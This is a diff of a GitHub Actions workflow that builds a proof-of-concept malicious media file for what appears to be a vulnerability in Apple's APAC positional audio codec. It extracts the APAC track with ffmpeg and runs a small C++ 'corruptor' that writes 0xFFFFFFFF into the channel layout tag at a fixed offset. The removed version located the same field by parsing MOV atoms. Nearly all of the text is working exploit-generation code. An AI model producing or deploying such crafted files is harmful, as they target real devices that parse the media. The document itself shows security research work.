@@ -61,144 +61,38 @@ jobs:
           }
           EOF
 
-      # This script is now an intelligent, self-contained parser and corruptor.
-      - name: Create C++ Parser and Corruptor
+      # This script is a simple utility to corrupt a file at a specific offset.
+      - name: Create C++ File Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Creating intelligent Objective-C++ file parser and corruption utility..."
-          cat > corruptor.mm << 'EOF'
-          #import <Foundation/Foundation.h>
+          echo "Creating simple C++ file corruption utility..."
+          cat > corruptor.cpp << 'EOF'
           #include <stdio.h>
-          #include <string.h>
-          #include <sys/types.h>
-
-          // Helper to read a 32-bit big-endian integer
-          uint32_t read_uint32_be(FILE *f) {
-              unsigned char bytes[4];
-              if (fread(bytes, 1, 4, f) != 4) return 0;
-              return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
-          }
-
-          // Helper to compare four-character atom names
-          bool compare_fourcc(const char* a, const char* b) {
-              return strncmp(a, b, 4) == 0;
-          }
-          
-          // Function to find the offset of a direct child atom within a parent container
-          long find_child_atom(FILE* f, const char* target_name, long parent_end_offset) {
-              long current_pos = ftell(f);
-              while (current_pos < parent_end_offset) {
-                  fseek(f, current_pos, SEEK_SET);
-                  long atom_start = ftell(f);
-                  uint32_t atom_size = read_uint32_be(f);
-                  if (atom_size == 0) return -1;
-                  char atom_name[5] = {0};
-                  if (fread(atom_name, 1, 4, f) != 4) return -1;
-
-                  if (compare_fourcc(atom_name, target_name)) {
-                      return atom_start;
-                  }
-                  current_pos = atom_start + atom_size;
-              }
-              return -1;
-          }
+          #include <stdlib.h>
 
           int main(int argc, const char * argv[]) {
-              @autoreleasepool {
-                  const char* baseName = "IMG_1047.mov";
-                  const char* pocName = "output_apac_poc.mp4";
-
-                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName] toPath:[NSString stringWithUTF8String:pocName] error:nil]) {
-                      fprintf(stderr, "Failed to copy base file.\n"); return 1;
-                  }
-                  fprintf(stderr, "Successfully copied base file.\n");
-
-                  FILE *file = fopen(pocName, "r+b");
-                  if (!file) {
-                      fprintf(stderr, "Failed to re-open file for corruption.\n"); return 1;
-                  }
-                  
-                  // Find the main 'moov' atom
-                  fseek(file, 0, SEEK_END);
-                  long file_size = ftell(file);
-                  fseek(file, 0, SEEK_SET);
-                  long moov_offset = find_child_atom(file, "moov", file_size);
-                  if (moov_offset == -1) { fprintf(stderr, "Could not find 'moov' atom.\n"); fclose(file); return 1; }
-
-                  fseek(file, moov_offset, SEEK_SET);
-                  uint32_t moov_size = read_uint32_be(file);
-                  
-                  // Iterate through tracks inside 'moov'
-                  long trak_search_start = moov_offset + 8;
-                  long stsd_offset = -1;
-                  while(trak_search_start < moov_offset + moov_size) {
-                      fseek(file, trak_search_start, SEEK_SET);
-                      long trak_offset = find_child_atom(file, "trak", moov_offset + moov_size);
-                      if (trak_offset == -1) break;
-
-                      fseek(file, trak_offset, SEEK_SET);
-                      uint32_t trak_size = read_uint32_be(file);
-                      
-                      fseek(file, trak_offset + 8, SEEK_SET);
-                      long mdia_offset = find_child_atom(file, "mdia", trak_offset + trak_size);
-                      if (mdia_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }
-                      
-                      fseek(file, mdia_offset, SEEK_SET);
-                      uint32_t mdia_size = read_uint32_be(file);
-                      
-                      fseek(file, mdia_offset + 8, SEEK_SET);
-                      long hdlr_offset = find_child_atom(file, "hdlr", mdia_offset + mdia_size);
-                      if (hdlr_offset == -1) { trak_search_start = trak_offset + trak_size; continue; }
-
-                      fseek(file, hdlr_offset + 16, SEEK_SET);
-                      char handler_type[5] = {0};
-                      fread(handler_type, 1, 4, file);
-
-                      if (compare_fourcc(handler_type, "soun")) {
-                          // This is an audio track. Check if it's the APAC one.
-                          fseek(file, mdia_offset + 8, SEEK_SET);
-                          long minf_offset = find_child_atom(file, "minf", mdia_offset + mdia_size);
-                          fseek(file, minf_offset, SEEK_SET);
-                          uint32_t minf_size = read_uint32_be(file);
-
-                          fseek(file, minf_offset + 8, SEEK_SET);
-                          long stbl_offset = find_child_atom(file, "stbl", minf_offset + minf_size);
-                          fseek(file, stbl_offset, SEEK_SET);
-                          uint32_t stbl_size = read_uint32_be(file);
-
-                          fseek(file, stbl_offset + 8, SEEK_SET);
-                          long current_stsd_offset = find_child_atom(file, "stsd", stbl_offset + stbl_size);
-
-                          // Check inside this stsd for an 'apac' atom
-                          fseek(file, current_stsd_offset + 8, SEEK_SET);
-                          uint32_t stsd_size = read_uint32_be(file); // Read size of stsd
-                          fseek(file, current_stsd_offset + 8, SEEK_SET); // Reset to start of children
-                          long apac_check_offset = find_child_atom(file, "apac", current_stsd_offset + stsd_size);
-
-                          if (apac_check_offset != -1) {
-                            stsd_offset = current_stsd_offset;
-                            break; // Found the APAC sound track
-                          }
-                      }
-                      trak_search_start = trak_offset + trak_size;
-                  }
-
-                  if (stsd_offset == -1) {
-                      fprintf(stderr, "Could not find the APAC audio track's 'stsd' atom.\n");
-                      fclose(file); return 1;
-                  }
-                  
-                  fprintf(stderr, "Found APAC audio 'stsd' atom at offset: 0x%lx\n", stsd_offset);
-
-                  // Corrupt the channel layout tag. The offset is relative to the start of the stsd atom.
-                  long corruption_offset = stsd_offset + 72;
-                  fseek(file, corruption_offset, SEEK_SET);
-                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
-                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
-                  
-                  fclose(file);
-                  fprintf(stderr, "Corruption complete.\n");
+              if (argc != 3) {
+                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
+                  return 1;
               }
+
+              const char* filePath = argv[1];
+              long offset = atol(argv[2]);
+
+              FILE *file = fopen(filePath, "r+b");
+              if (!file) {
+                  fprintf(stderr, "Corruptor error: Failed to open file: %s\n", filePath);
+                  return 1;
+              }
+
+              fseek(file, offset, SEEK_SET);
+              
+              // This is the specific malicious data for the channel layout tag
+              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+              fclose(file);
+              
+              fprintf(stderr, "Corruption complete at offset 0x%lx.\n", offset);
               return 0;
           }
           EOF
@@ -209,7 +103,7 @@ jobs:
         with:
           xcode-version: '15.4'
 
-      # Compile the C++ utility
+      # Compile the Swift and C++ utilities
       - name: Compile Custom Tools
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
@@ -217,14 +111,46 @@ jobs:
           swiftc harness.swift -o harness
           if [ ! -f ./harness ]; then echo "Swift harness compilation failed."; exit 1; fi
           echo "Compiling C++ corruptor..."
-          clang++ -g corruptor.mm -o corruptor -framework Foundation
+          clang++ -g corruptor.cpp -o corruptor
           if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
 
-      # Run the new C++ utility to parse and corrupt the file.
-      - name: Surgically Corrupt APAC File
+      # This is the main step that finds the APAC track, extracts it, and corrupts it.
+      - name: Extract and Surgically Corrupt APAC Track
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          ./corruptor
+          set -x 
+          
+          echo "Installing ffmpeg to identify the APAC stream..."
+          brew install ffmpeg
+
+          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
+          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1047.mov | grep 'apac' -B 1 | head -n 1)
+
+          if [ -z "$APAC_STREAM_INDEX" ]; then
+            echo "Could not find an APAC audio stream in the MOV file. Aborting."
+            exit 1
+          fi
+
+          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
+          
+          # Step 2: Use ffmpeg to extract the raw APAC stream into a clean MP4 file container.
+          # The -map 0:[index] command selects the specific stream.
+          # The -c:a copy command performs a direct stream copy without re-encoding.
+          ffmpeg -i IMG_1047.mov -map 0:${APAC_STREAM_INDEX} -c:a copy output_apac_clean.mp4
+
+          if [ $? -ne 0 ]; then
+              echo "ffmpeg failed to create a clean APAC file."
+              exit 1
+          fi
+
+          echo "Successfully created a clean APAC file. Now corrupting it..."
+          cp output_apac_clean.mp4 output_apac_poc.mp4
+
+          # Step 3: Run the C++ utility to perform the corruption.
+          # For a clean file created with ffmpeg, the offset is much more predictable.
+          CORRUPTION_OFFSET=288 
+          ./corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
+          
           echo "Malicious APAC PoC file generated."
           ls -l output_apac_poc.mp4
           
